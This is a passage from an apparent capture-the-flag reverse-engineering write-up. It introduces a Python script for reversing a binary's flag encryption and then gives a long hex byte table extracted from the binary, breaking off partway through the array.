dword_560CC63C71B0 and dword_560CC63C71B8 into memory ill be the start of encrypted string we inserted Writing the reverse scriptWrite the reverse string is like writing the script from the bottom of the page to the top, it’s like rewinding a VHS tape back to the beginning of the movie, in our case we want to convert the encrypted flag value to the original flag. I wrote my script in python 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150from struct import *max_bits = 32off_560CC63C7150 = [0x6E, 0x4D, 0x1A, 0xC0, 0x36, 0x66, 0xCB, 0xA4, 0xA1, 0x5B, 0x0F, 0x5B, 0x26, 0x69, 0x26, 0x2B, 0x8F, 0xCB, 0x75, 0xEF, 0x2A, 0x22, 0x37, 0xA0, 0x9A, 0x61, 0x69, 0xBA, 0x32, 0x89, 0x79, 0x60, 0x59, 0xA8, 0x6E, 0x02, 0x93, 0x58, 0x31, 0xF1, 0xA6, 0x33, 0x59, 0x8B, 0x67, 0xAC, 0x2B, 0xE7, 0x04, 0x89, 0xCC, 0x1A, 0xEF, 0xD1, 0x48, 0x2E, 0xAB, 0xD5, 0x21, 0x3F, 0x1F, 0x5A, 0x33, 0x69, 0xF0, 0x68, 0x83, 0xBE, 0xC3, 0x84, 0xF7, 0xF1, 0x90, 0x49, 0x20, 0x18, 0x68, 0xA1, 0xCE, 0x18, 0x57, 0x91, 0x96, 0x33, 0x47, 0xF1, 0xEB, 0x21, 0x72, 0xF8, 0x7A, 0xFA, 0x6C, 0xBE, 0xE6, 0xAB, 0x7E, 0x61, 0x4E, 0x51, 0xC2, 0x3F, 0x77, 0xEC, 0x6A, 0xC3, 0x18, 0xC6, 0xA4, 0xF7, 0xCE, 0xF9, 0x01, 0xB3, 0xDC, 0x75, 0x7A, 0x8C, 0xE1, 0xAE, 0x69, 0x26, 0xF2, 0x24, 0x5F, 0x35, 0xDB, 0x9A, 0x23, 0xE1, 0x4E, 0x77, 0xA0, 0x34, 0xF4, 0xC8, 0xEF, 0x97, 0x7E, 0xF4, 0xF7, 0x7D, 0x79, 0x43, 0x45, 0x6A, 0xE4, 0xF6, 0xD5, 0x80, 0xB7, 0x05, 0x40, 0xBF, 0xE1, 0xE3, 0x32, 0x75, 0xDD, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0B, 0xE7, 0x56, 0x56, 0x17, 0xFC, 0x43, 0x43, 0x71, 0x37, 0xBB, 0xBB, 0x85, 0xFE, 0x08, 0x08, 0xD3, 0x09, 0xD4, 0xD4, 0xFB, 0x2B, 0xE2, 0xE2, 0x1E, 0xAD, 0xA2, 0xA2, 0xB2, 0x2A, 0x73, 0x73, 0xF4, 0xC9, 0xB3, 0xB3, 0x3C, 0x33, 0x2D, 0x2D, 0xD0, 0xE4, 0x8C, 0x8C, 0x02, 0xB6, 0xB7, 0xB7, 0x59, 0x15, 0x8D, 0x8D, 0x8D, 0xF4, 0x06, 0x06, 0x5D, 0x10, 0x8A, 0x8A, 0x75, 0x32, 0xBC, 0xBC, 0xCB, 0x17, 0xC6, 0xC6, 0xC7, 0x18, 0xCF, 0xCF, 0x3E, 0x85, 0x9A, 0x9A, 0x9B, 0x53, 0xAA, 0xAA, 0x1F, 0xF6, 0x4D, 0x4D, 0x7E, 0xD5, 0xEA, 0xEA, 0x60, 0x78, 0x48, 0x48, 0x80, 0xA0, 0xE0, 0xE0, 0xCE, 0x49, 0x2E, 0x2E, 0x24, 0x2D, 0x3F, 0x3F, 0xB4, 0x99, 0xC3, 0xC3, 0x95, 0xEA, 0x14, 0x14, 0x94, 0xB1, 0xFB, 0xFB, 0x3F, 0xDE, 0x75, 0x75, 0x1D, 0x40, 0xFA, 0xFA, 0x05, 0x5E, 0xE8, 0xE8, 0x4E, 0xE9, 0xCE, 0xCE, 0x47, 0xB8, 0x2F, 0x2F, 0x4F, 0xB2, 0x21, 0x21, 0x07, 0xE8, 0x5F, 0x5F, 0xB6, 0x2F, 0x74, 0x74, 0x39, 0x6D, 0xC5, 0xC5, 0x2D, 0x7C, 0xDE, 0xDE, 0x1B, 0xF3, 0x4A, 0x4A, 0x8C, 0xAF, 0xE9, 0xE9, 0x79, 0x3D, 0xB5, 0xB5, 0x44, 0x55, 0x77, 0x77, 0x8F, 0x42, 0xB1, 0xB1, 0x04, 0x05, 0x07, 0x07, 0x9F, 0x56, 0xAD, 0xAD, 0x86, 0x13, 0x50, 0x50, 0x9A, 0x08, 0x45, 0x45, 0x98, 0xBE, 0xF2, 0xF2, 0xBC, 0x93, 0xCD, 0xCD, 0x54, 0x41, 0x6B, 0x6B, 0xC3, 0x1D, 0xC8, 0xC8, 0x4D, 0x04, 0x96, 0x96, 0xAE, 0x31, 0x66, 0x66, 0x83, 0x4D, 0xB8, 0xB8, 0x91, 0xEF, 0x13, 0x13, 0x3D, 0x68, 0xC2, 0xC2, 0xBB, 0x7B, 0x92, 0x92, 0xCA, 0x4C, 0x29, 0x29, 0xE4, 0xDD, 0xAF, 0xAF, 0x0E, 0xB9, 0xBE, 0xBE, 0xA9, 0xD9, 0x39, 0x39, 0xD2, 0x52, 0x3B, 0x3B, 0xB9, 0xCD, 0x25, 0x25, 0xE3, 0x35, 0xF0, 0xF0, 0x64, 0x7D, 0x4F, 0x4F, 0x38, 0x36, 0x2A, 0x2A, 0x19, 0x45, 0xFD, 0xFD, 0x3A, 0x80, 0x9D, 0x9D, 0xAC, 0x87, 0xD1, 0xD1, 0xD7, 0x0C, 0xD3, 0xD3, 0xD4, 0xE1, 0x8B, 0x8B, 0x8B, 0x47, 0xB6, 0xB6, 0x7B, 0x8B, 0x02, 0x02, 0x13, 0xF9, 0x44, 0x44, 0x41, 0x0B, 0x9F, 0x9F, 0x09, 0x51, 0xE1, 0xE1, 0x6C, 0x77, 0x41, 0x41, 0x50, 0x44, 0x6C, 0x6C, 0x2C, 0x27, 0x31, 0x31, 0x6B, 0x9F, 0x1E, 0x1E, 0x14, 0x11, 0x1B, 0x1B, 0x45, 0x0E, 0x98, 0x98, 0xF5, 0x92, 0x5C, 0x5C, 0x34, 0x39, 0x23, 0x23, 0x7A, 0xD0, 0xED, 0xED, 0xEE, 0x61, 0x16, 0x16, 0x90, 0xB4, 0xFC, 0xFC, 0xDC, 0xEB, 0x85, 0x85, 0xF3, 0x21, 0xEC, 0xEC, 0xAB, 0x6F, 0x8E, 0x8E, 0xB1, 0xC7, 0x2B, 0x2B, 0xED, 0x8C, 0x4E, 0x4E, 0x77, 0x84, 0x0B, 0x0B, 0xC4, 0xF5, 0x97, 0x97, 0x03, 0xED, 0x58, 0x58, 0xDE, 0x5D, 0x32, 0x32, 0xE1, 0x83, 0x47, 0x47, 0x89, 0xF1, 0x01, 0x01, 0x6D, 0x2C, 0xAE, 0xAE, 0x76, 0xDF, 0xE4, 0xE4, 0x48, 0x5A, 0x7E, 0x7E, 0x49, 0x01, 0x91, 0x91, 0xE7, 0x30, 0xF7, 0xF7, 0xC5, 0xAE, 0x78, 0x78, 0xCC, 0xFF, 0x99, 0x99, 0xD9, 0xB5, 0x6D, 0x6D, 0x1A, 0xA8, 0xA5, 0xA5, 0x55, 0x1A, 0x84, 0x84, 0xA8, 0x82, 0xD6, 0xD6, 0x6E, 0xC1, 0xF6, 0xF6, 0xAA, 0x34, 0x61, 0x61, 0x73, 0x81, 0x0C, 0x0C, 0x37, 0xD4, 0x7B, 0x7B, 0x53, 0xA9, 0x34, 0x34, 0xF1, 0x97, 0x5B, 0x5B, 0x96, 0x07, 0x4C, 0x4C, 0xDF, 0x06, 0xDD, 0xDD, 0x00, 0x00, 0x00, 0x00, 0x6F, 0x9A, 0x19, 0x19, 0x33, 0xD1, 0x7C, 0x7C, 0x32, 0x8A, 0x93, 0x93, 0x16, 0xA7, 0xAC, 0xAC, 0x81, 0xFB, 0x0F, 0x0F, 0x9C, 0xBB, 0xF5, 0xF5, 0xC1, 0xAB, 0x7F, 0x7F, 0x5F, 0xA6, 0x3D, 0x3D, 0xE6, 0x6B, 0x18, 0x18, 0x30, 0x3C, 0x24, 0x24, 0xF8, 0xC6, 0xBA, 0xBA, 0xE9, 0x89, 0x49, 0x49, 0xBF, 0x7E, 0x95, 0x95, 0x58, 0x4E, 0x62, 0x62, 0xBD, 0xC8, 0x22, 0x22, 0x5B, 0xA3, 0x3A, 0x3A, 0xF0, 0xCC, 0xB4, 0xB4, 0x5E, 0xFD, 0xD2, 0xD2, 0x01, 0x5B, 0xEF, 0xEF, 0x22, 0x9E, 0x8F, 0x8F, 0xA4, 0x8D, 0xDF, 0xDF, 0x97, 0x5C, 0xA3, 0xA3, 0xA7, 0x60, 0x87, 0x87, 0x99, 0xE5, 0x1D, 0x1D, 0xB7, 0x74, 0x9B, 0x9B, 0xAF, 0x6A, 0x89, 0x89, 0x78, 0x66, 0x5A, 0x5A, 0x29, 0x79, 0xD9, 0xD9, 0xEC, 0xD7, 0xA1, 0xA1, 0xEA, 0x64, 0x11, 0x11, 0xE2, 0x6E, 0x1F, 0x1F, 0x62, 0xCE, 0xFF, 0xFF, 0xC8, 0xFA, 0x9E, 0x9E, 0xE5, 0x86, 0x40, 0x40, 0x56, 0xF7, 0xDC, 0xDC, 0x4B, 0xB7, 0x26, 0x26, 0xF9, 0x9D, 0x55, 0x55, 0x74, 0x69, 0x53, 0x53, 0x1C, 0x1B, 0x15, 0x15, 0x61, 0x23, 0xA7, 0xA7, 0x7C, 0x63, 0x5D, 0x5D, 0xCF, 0x12, 0xC1, 0xC1, 0xC0, 0xF0, 0x90, 0x90, 0x4A, 0xEC, 0xC9, 0xC9, 0xFD, 0x98, 0x52, 0x52, 0x65, 0x26, 0xA0, 0xA0, 0x35, 0x62, 0xCC, 0xCC, 0xB5, 0xC2, 0x2C, 0x2C, 0x2A, 0x94, 0x81, 0x81, 0xEB, 0x3F, 0xFE, 0xFE, 0x43, 0xBD, 0x28, 0x28, 0x20, 0x28, 0x38, 0x38, 0x67, 0x90, 0x17, 0x17, 0x8A, 0x1C, 0x59, 0x59, 0xF6, 0x7F, 0x04, 0x04, 0x42, 0xE6, 0xC7, 0xC7, 0x0D, 0x54, 0xE6, 0xE6, 0x63, 0x95, 0x10, 0x10, 0x72, 0xDA, 0xE3, 0xE3, 0xCD, 0xA4, 0x76, 0x76, 0xD6, 0x57, 0x3C, 0x3C, 0x0A, 0xBC, 0xB9, 0xB9, 0x40, 0x50, 0x70, 0x70, 0xDB, 0x03, 0xDA, 0xDA, 0xA3, 0x65, 0x80, 0x80, 0xFE, 0x75, 0x0A, 0x0A, 0xAD, 0xDC, 0x3E, 0x3E, 0xB3, 0x71, 0x9C, 0x9C, 0xF7, 0x24, 0xEB, 0xEB, 0xA0, 0x88, 0xD8, 0xD8, 0x28, 0x22, 0x36, 0x36, 0x7F, 0x8E, 0x05, 0x05, 0xDD, 0xB0, 0x6A, 0x6A, 0x68, 0x72, 0x46, 0x46, 0xA5, 0xD6, 0x30, 0x30, 0x92, 0x02, 0x4B, 0x4B, 0xD1, 0xBF, 0x63, 0x63, 0x52, 0xF2, 0xDB, 0xDB, 0x2E, 0x91, 0x86, 0x86, 0x57, 0xAC, 0x33, 0x33, 0x9D, 0xE0, 0x1A, 0x1A, 0x46, 0xE3, 0xC0, 0xC0, 0xC9, 0xA1, 0x71, 0x71, 0x70, 0x6C, 0x54, 0x54, 0x2B, 0xCF, 0x6E, 0x6E, 0x66, 0xCB, 0xF8, 0xF8, 0xC2, 0x46, 0x27, 0x27, 0x26, 0x9B, 0x88, 0x88, 0xD8, 0xEE, 0x82, 0x82, 0x36, 0x8F, 0x94, 0x94, 0x23, 0xC5, 0x60, 0x60, 0x5A, 0xF8, 0xD5, 0xD5, 0x25, 0x76, 0xD0, 0xD0, 0x82, 0x16, 0x57, 0x57, 0xC6, 0x43, 0x20, 0x20, 0x84, 0xA5, 0xE7, 0xE7, 0x06, 0xB3, 0xB0, 0xB0, 0x9E, 0x0D, 0x42, 0x42, 0x4C, 0x5F, 0x79, 0x79, 0xBA, 0x20, 0x7D, 0x7D, 0xE0, 0xD8, 0xA8, 0xA8, 0xB0, 0x9C, 0xC4, 0xC4, 0x93, 0x59, 0xA4, 0xA4, 0x27, 0xC0, 0x67, 0x67, 0x08, 0x0A, 0x0E, 0x0E, 0x12, 0xA2, 0xAB, 0xAB, 0x3B, 0xDB, 0x72, 0x72, 0xFC, 0xC3, 0xBD, 0xBD, 0xB8, 0x96, 0xCA, 0xCA, 0xFA, 0x70, 0x0D, 0x0D, 0xEF, 0x3A, 0xF9, 0xF9, 0x0F, 0xE2, 0x51, 0x51, 0x6A, 0xC4, 0xF1, 0xF1, 0x2F, 0xCA, 0x69, 0x69, 0x15, 0x4A, 0xF4, 0xF4, 0xDA, 0x58, 0x35, 0x35, 0x10, 0x14, 0x1C, 0x1C, 0x88, 0xAA, 0xEE, 0xEE, 0xA1, 0xD3, 0x37, 0x37, 0xBE, 0x25, 0x7A, 0x7A, 0xF2, 0x7A, 0x03, 0x03, 0x21, 0x73, 0xD7, 0xD7, 0x5C, 0x4B, 0x65, 0x65, 0x0C, 0x0F, 0x09, 0x09, 0xFF, 0x2E, 0xE5, 0xE5, 0x31, 0x67, 0xCB, 0xCB, 0xA6, 0x3B, 0x68, 0x68, 0xD5, 0xBA, 0x64, 0x64, 0x7D, 0x38, 0xB2, 0xB2, 0x11, 0x4F, 0xF3, 0xF3, 0x87, 0x48, 0xBF, 0xBF, 0x51, 0x1F, 0x83, 0x83, 0x18, 0x1E, 0x12, 0x12, 0xE8, 0xD2, 0xA6, 0xA6, 0x8E, 0x19, 0x5E, 0x5E, 0x69, 0x29, 0xA9, 0xA9, 0xA2, 0x3E, 0x6F, 0x6F, 0x07, 0x07, 0x05, 0x04, 0x6C, 0x6C, 0x44, 0x50, 0xC1, 0xC1, 0x12, 0xCF, 0x28, 0x28, 0xBD, 0x43, 0xF6, 0xF6, 0xC1, 0x6E, 0x84, 0x84, 0x1A, 0x55, 0x3D, 0x3D, 0xA6, 0x5F, 0xBD, 0xBD, 0xC3, 0xFC, 0x9E, 0x9E, 0xFA, 0xC8, 0x48, 0x48, 0x78, 0x60, 0xD2, 0xD2, 0xFD, 0x5E, 0xD0, 0xD0, 0x76, 0x25, 0x5F, 0x5F, 0xE8, 0x07, 0x06, 0x06, 0xF4, 0x8D, 0xCC, 0xCC, 0x62, 0x35, 0xD7, 0xD7, 0x73, 0x21, 0x7A, 0x7A, 0x25, 0xBE, 0xBA, 0xBA, 0xC6, 0xF8, 0x87, 0x87, 0x60, 0xA7, 0x2E, 0x2E, 0x49, 0xCE, 0x11, 0x11, 0x64, 0xEA, 0x65, 0x65, 0x4B, 0x5C, 0x81, 0x81, 0x94, 0x2A, 0xB3, 0xB3, 0xC9, 0xF4, 0xBE, 0xBE, 0xB9, 0x0E, 0x59, 0x59, 0x1C, 0x8A, 0x41, 0x41, 0x77, 0x6C, 0x2A, 0x2A, 0x36, 0x38, 0x90, 0x90, 0xF0, 0xC0, 0xE2, 0xE2, 0x2B, 0xFB, 0x18, 0x18, 0x6B, 0xE6, 0xA4, 0xA4, 0x59, 0x93, 0xA9, 0xA9, 0x29, 0x69, 0x1A, 0x1A, 0xE0, 0x9D, 0x93, 0x93, 0x8A, 0x32, 0x1C, 0x1C, 0x14, 0x10, 0x6B, 0x6B, 0x41, 0x54, 0x0C, 0x0C, 0x81, 0x73, 0x37, 0x37, 0xD3, 0xA1, 0x4E, 0x4E, 0x8C, 0xED, 0x0B, 0x0B, 0x84, 0x77, 0x05, 0x05, 0x8E, 0x7F, 0x0F, 0x0F, 0xFB, 0x81, 0x5D, 0x5D, 0x63, 0x7C, 0xD3, 0xD3, 0x0C, 0xD7, 0x32, 0x32, 0x5D, 0xDE, 0x96, 0x96, 0x04, 0x4D, 0xF4, 0xF4, 0x4A, 0x15, 0x1E, 0x1E, 0x9F, 0x6B, 0xAD, 0xAD, 0x56, 0x9F, 0xC8, 0xC8, 0x1D, 0xC3, 0xF5, 0xF5, 0xBB, 0x9C, 0xBF, 0xBF, 0x48, 0x87, 0x3A, 0x3A, 0xA3, 0x5B, 0x98, 0x98, 0x0E, 0x45, 0x2D, 0x2D, 0x33, 0x3C, 0xB8, 0xB8, 0x4D, 0x83, 0xC2, 0xC2, 0x68, 0x3D, 0xA3, 0xA3, 0x5C, 0x97, 0x68, 0x68, 0x3B, 0xA6, 0xC6, 0xC6, 0x17, 0xCB, 0xEE, 0xEE, 0xAA, 0x88, 0xA6, 0xA6, 0xD2, 0xE8, 0xE1, 0xE1, 0x51, 0x09, 0xA8, 0xA8, 0xD8, 0xE0, 0xD8, 0xD8, 0x88, 0xA0, 0xD1, 0xD1, 0x87, 0xAC, 0x04, 0x04, 0x7F, 0xF6, 0xE5, 0xE5, 0x2E, 0xFF, 0xF1, 0xF1, 0xC4, 0x6A, 0xBC, 0xBC, 0x32, 0x75, 0xFD, 0xFD, 0x45, 0x19, 0x27, 0x27, 0x46, 0xC2, 0x3C, 0x3C, 0x57, 0xD6, 0x50, 0x50, 0x13, 0x86, 0x8B, 0x8B, 0xE1, 0xD4, 0x79, 0x79, 0x5F, 0x4C, 0xFB, 0xFB, 0xB1, 0x94, 0x76, 0x76, 0xA4, 0xCD, 0x21, 0x21, 0xB2, 0x4F, 0x35, 0x35, 0x58, 0xDA, 0x19, 0x19, 0x9A, 0x6F, 0xB2, 0xB2, 0x38, 0x7D, 0x3F, 0x3F, 0x2D, 0x24, 0x1D, 0x1D, 0xE5, 0x99, 0x99, 0x99, 0xFF, 0xCC, 0x42, 0x42, 0x0D, 0x9E, 0x0E, 0x0E, 0x0A, 0x08, 0x57, 0x57, 0x16, 0x82, 0x13, 0x13, 0xEF, 0x91, 0xFC, 0xFC, 0xB4, 0x90, 0x4F, 0x4F, 0x7D, 0x64, 0xA1, 0xA1, 0xD7, 0xEC, 0xB9, 0xB9, 0xBC, 0x0A, 0x00, 0x00, 0x00, 0x00, 0xCB, 0xCB, 0x67, 0x31, 0x63, 0x63, 0xBF, 0xD1, 0x15, 0x15, 0x1B, 0x1C, 0x44, 0x44, 0xF9, 0x13, 0xCA, 0xCA, 0x96, 0xB8, 0x78, 0x78, 0xAE, 0xC5, 0x6F, 0x6F, 0x3E, 0xA2, 0xE3, 0xE3, 0xDA, 0x72, 0x54, 0x54, 0x6C, 0x70, 0x8F, 0x8F, 0x9E, 0x22, 0x9F, 0x9F, 0x0B, 0x41, 0x3B, 0x3B, 0x52, 0xD2, 0x4D, 0x4D, 0xF6, 0x1F, 0x33, 0x33, 0xAC, 0x57, 0xDA, 0xDA, 0x03, 0xDB, 0x34, 0x34, 0xA9, 0x53, 0xB6, 0xB6, 0x47, 0x8B, 0xFF, 0xFF, 0xCE, 0x62, 0xB0, 0xB0, 0xB3, 0x06, 0x4A, 0x4A, 0xF3, 0x1B, 0x4C, 0x4C, 0x07, 0x96, 0x0D, 0x0D, 0x70, 0xFA, 0xA5, 0xA5, 0xA8, 0x1A, 0xA7, 0xA7, 0x23, 0x61, 0xAE, 0xAE, 0x2C, 0x6D, 0x2F, 0x2F, 0xB8, 0x47, 0x92, 0x92, 0x7B, 0xBB, 0x73, 0x73, 0x2A, 0xB2, 0xC4, 0xC4, 0x9C, 0xB0, 0x9A, 0x9A, 0x85, 0x3E, 0x83, 0x83, 0x1F, 0x51, 0x40, 0x40, 0x86, 0xE5, 0xB4, 0xB4, 0xCC, 0xF0, 0x14, 0x14, 0xEA, 0x95, 0x6A, 0x6A, 0xB0, 0xDD, 0xE4, 0xE4, 0xDF, 0x76, 0x89, 0x89, 0x6A, 0xAF, 0x66, 0x66, 0x31, 0xAE, 0x0A, 0x0A, 0x75, 0xFE, 0xC0, 0xC0, 0xE3, 0x46, 0x8C, 0x8C, 0xE4, 0xD0, 0x62, 0x62, 0x4E, 0x58, 0x60, 0x60, 0xC5, 0x23, 0x94, 0x94, 0x8F, 0x36, 0xF8, 0xF8, 0xCB, 0x66, 0x36, 0x36, 0x22, 0x28, 0x72, 0x72, 0xDB, 0x3B, 0x49, 0x49, 0x89, 0xE9, 0x8D, 0x8D, 0x15, 0x59, 0x7F, 0x7F, 0xAB, 0xC1, 0xB5, 0xB5, 0x3D, 0x79, 0x17, 0x17, 0x90, 0x67, 0xD6, 0xD6, 0x82, 0xA8, 0x9D, 0x9D, 0x80, 0x3A, 0x52, 0x52, 0x98, 0xFD, 0x5C, 0x5C, 0x92, 0xF5, 0x97, 0x97, 0xF5, 0xC4, 0x8E, 0x8E, 0x6F, 0xAB, 0xED, 0xED, 0xD0, 0x7A, 0x71, 0x71, 0xA1, 0xC9, 0x4B, 0x4B, 0x02, 0x92, 0xAA, 0xAA, 0x53, 0x9B, 0xE9, 0xE9, 0xAF, 0x8C, 0xEA, 0xEA, 0xD5, 0x7E, 0x56, 0x56, 0xE7, 0x0B, 0x39, 0x39, 0xD9, 0xA9, 0xDD, 0xDD, 0x06, 0xDF, 0x10, 0x10, 0x95, 0x63, 0xC3, 0xC3, 0x99, 0xB4, 0x75, 0x75, 0xDE, 0x3F, 0xF9, 0xF9, 0x3A, 0xEF, 0x8A, 0x8A, 0x10, 0x5D, 0x88, 0x88, 0x9B, 0x26, 0xF7, 0xF7, 0x30, 0xE7, 0x61, 0x61, 0x34, 0xAA, 0x6E, 0x6E, 0xCF, 0x2B, 0x77, 0x77, 0x55, 0x44, 0x26, 0x26, 0xB7, 0x4B, 0x02, 0x02, 0x8B, 0x7B, 0xB7, 0xB7, 0xB6, 0x02, 0x7E, 0x7E, 0x5A, 0x48, 0x24, 0x24, 0x3C, 0x30, 0x1B, 0x1B, 0x11, 0x14, 0xDF, 0xDF, 0x8D, 0xA4, 0x80, 0x80, 0x65, 0xA3, 0xAF, 0xAF, 0xDD, 0xE4, 0xA2, 0xA2, 0xAD, 0x1E, 0x86, 0x86, 0x91, 0x2E, 0x43, 0x43, 0xFC, 0x17, 0x91, 0x91, 0x01, 0x49, 0xCD, 0xCD, 0x93, 0xBC, 0xBB, 0xBB, 0x37, 0x71, 0x46, 0x46, 0x72, 0x68, 0x2B, 0x2B, 0xC7, 0xB1, 0xE0, 0xE0, 0xA0, 0x80, 0x09, 0x09, 0x0F, 0x0C, 0xAC, 0xAC, 0xA7, 0x16, 0x01, 0x01, 0xF1, 0x89, 0xA0, 0xA0, 0x26, 0x65, 0x85, 0x85, 0xEB, 0xDC, 0x3E, 0x3E, 0xDC, 0xAD, 0x58, 0x58, 0xED, 0x03, 0x25, 0x25, 0xCD, 0xB9, 0xF2, 0xF2, 0xBE, 0x98, 0xB1, 0xB1, 0x42, 0x8F, 0xAB, 0xAB, 0xA2, 0x12, 0xDB, 0xDB, 0xF2, 0x52, 0x9B, 0x9B, 0x74, 0xB7, 0x23, 0x23, 0x39, 0x34, 0x5B, 0x5B, 0x97, 0xF1, 0x2C, 0x2C, 0xC2, 0xB5, 0xCE, 0xCE, 0xE9, 0x4E, 0xD5, 0xD5, 0xF8, 0x5A, 0x38, 0x38, 0x28, 0x20, 0x69, 0x69, 0xCA, 0x2F, 0x30, 0x30, 0xD6, 0xA5, 0xC7, 0xC7, 0xE6, 0x42, 0x31, 0x31, 0x27, 0x2C, 0x67, 0x67, 0xC0, 0x27, 0xEF, 0xEF, 0x5B, 0x01, 0xE8, 0xE8, 0x5E, 0x05, 0x7C, 0x7C, 0xD1, 0x33, 0x20, 0x20, 0x43, 0xC6, 0x29, 0x29, 0x4C, 0xCA, 0x70, 0x70, 0x50, 0x40, 0xF3, 0xF3, 0x4F, 0x11, 0xFE, 0xFE, 0x3F, 0xEB, 0x55, 0x55, 0x9D, 0xF9, 0xE7, 0xE7, 0xA5, 0x84, 0x16, 0x16, 0x61, 0xEE, 0xDC, 0xDC, 0xF7, 0x56, 0x47, 0x47, 0x83, 0xE1, 0x95, 0x95, 0x7E, 0xBF, 0x08, 0x08, 0xFE, 0x85, 0xCF, 0xCF, 0x18, 0xC7, 0x03, 0x03, 0x7A, 0xF2, 0x64, 0x64, 0xBA, 0xD5, 0xF0, 0xF0, 0x35, 0xE3, 0xDE, 0xDE, 0x7C, 0x2D, 0x12, 0x12, 0x1E, 0x18, 0x53, 0x53, 0x69, 0x74, 0xC9, 0xC9, 0xEC, 0x4A, 0x82, 0x82, 0xEE, 0xD8, 0x5E, 0x5E, 0x19, 0x8E, 0x7D, 0x7D, 0x20, 0xBA, 0xD9, 0xD9, 0x79, 0x29, 0x45, 0x45, 0x08, 0x9A, 0xC5, 0xC5, 0x6D, 0x39, 0x6D, 0x6D, 0xB5, 0xD9, 0xFA, 0xFA, 0x40, 0x1D, 0x74, 0x74, 0x2F, 0xB6, 0x7B, 0x7B, 0xD4, 0x37, 0x5A, 0x5A, 0x66, 0x78, 0x1F, 0x1F, 0x6E, 0xE2, 0xEC, 0xEC, 0x21, 0xF3, 0xEB, 0xEB, 0x24, 0xF7, 0x22, 0x22, 0xC8, 0xBD, 0x9C, 0x9C, 0x71, 0xB3, 0xD4, 0xD4, 0x09, 0xD3, 0x51, 0x51, 0xE2, 0x0F, 0xE6, 0xE6, 0x54, 0x0D, 0xB9, 0xBE, 0x0E, 0xBE, 0xC8, 0x22, 0xBD, 0x22, 0x4C, 0x29, 0xCA, 0x29, 0xB1, 0xFB, 0x94, 0xFB, 0xF3, 0x4A, 0x1B, 0x4A, 0xD1, 0x7C, 0x33, 0x7C, 0xB4, 0xFC, 0x90, 0xFC, 0x95, 0x10, 0x63, 0x10, 0x16, 0x57, 0x82, 0x57, 0xA6, 0x3D, 0x5F, 0x3D, 0xF6, 0x4D, 0x1F, 0x4D, 0x32, 0xBC, 0x75, 0xBC, 0x31, 0x66, 0xAE, 0x66, 0xC0, 0x67, 0x27, 0x67, 0xFC, 0x43, 0x17, 0x43, 0x0D, 0x42, 0x9E, 0x42, 0xDA, 0xE3, 0x72, 0xE3, 0xE7, 0x56, 0x0B, 0x56, 0x94, 0x81, 0x2A, 0x81, 0x0C, 0xD3, 0xD7, 0xD3, 0x1B, 0x15, 0x1C, 0x15, 0x08, 0x45, 0x9A, 0x45, 0x8E, 0x05, 0x7F, 0x05, 0x2D, 0x3F, 0x24, 0x3F, 0xFA, 0x9E, 0xC8, 0x9E, 0x5B, 0xEF, 0x01, 0xEF, 0xE0, 0x1A, 0x9D, 0x1A, 0xAE, 0x78, 0xC5, 0x78, 0x2A, 0x73, 0xB2, 0x73, 0x48, 0xBF, 0x87, 0xBF, 0x12, 0xC1, 0xCF, 0xC1, 0x77, 0x41, 0x6C, 0x41, 0x19, 0x5E, 0x8E, 0x5E, 0x3C, 0x24, 0x30, 0x24, 0xBC, 0xB9, 0x0A, 0xB9, 0xDF, 0xE4, 0x76, 0xE4, 0x7F, 0x04, 0xF6, 0x04, 0xB3, 0xB0, 0x06, 0xB0, 0x3E, 0x6F, 0xA2, 0x6F, 0xC5, 0x60, 0x23, 0x60, 0x7D, 0x4F, 0x64, 0x4F, 0xA5, 0xE7, 0x84, 0xE7, 0xE1, 0x8B, 0xD4, 0x8B, 0x8A, 0x93, 0x32, 0x93, 0xBD, 0x28, 0x43, 0x28, 0x76, 0xD0, 0x25, 0xD0, 0x4D, 0xB8, 0x83, 0xB8, 0x9D, 0x55, 0xF9, 0x55, 0x47, 0xB6, 0x8B, 0xB6, 0x1D, 0xC8, 0xC3, 0xC8, 0x09, 0xD4, 0xD3, 0xD4, 0xC7, 0x2B, 0xB1, 0x2B, 0x84, 0x0B, 0x77, 0x0B, 0x63, 0x5D, 0x7C, 0x5D, 0xEC, 0xC9, 0x4A, 0xC9, 0x97, 0x5B, 0xF1, 0x5B, 0x9F, 0x1E, 0x6B, 0x1E, 0x9B, 0x88, 0x26, 0x88, 0x5E, 0xE8, 0x05, 0xE8, 0x62, 0xCC, 0x35, 0xCC, 0x50, 0x70, 0x40, 0x70, 0x87, 0xD1, 0xAC, 0xD1, 0x0E, 0x98, 0x45, 0x98, 0xC6, 0xBA, 0xF8, 0xBA, 0xF5, 0x97, 0xC4, 0x97, 0x4E, 0x62, 0x58, 0x62, 0xA1, 0x71, 0xC9, 0x71, 0x7A, 0x03, 0xF2, 0x03, 0xBF, 0x63, 0xD1, 0x63, 0x45, 0xFD, 0x19, 0xFD, 0x20, 0x7D, 0xBA, 0x7D, 0x6A, 0x89, 0xAF, 0x89, 0x30, 0xF7, 0xE7, 0xF7, 0x3D, 0xB5, 0x79, 0xB5, 0x60, 0x87, 0xA7, 0x87, 0x0B, 0x9F, 0x41, 0x9F, 0x52, 0x3B, 0xD2, 0x3B, 0x86, 0x40, 0xE5, 0x40, 0xD3, 0x37, 0xA1, 0x37, 0xAF, 0xE9, 0x8C, 0xE9, 0x6D, 0xC5, 0x39, 0xC5, 0x61, 0x16, 0xEE, 0x16, 0x82, 0xD6, 0xA8, 0xD6, 0xD7, 0xA1, 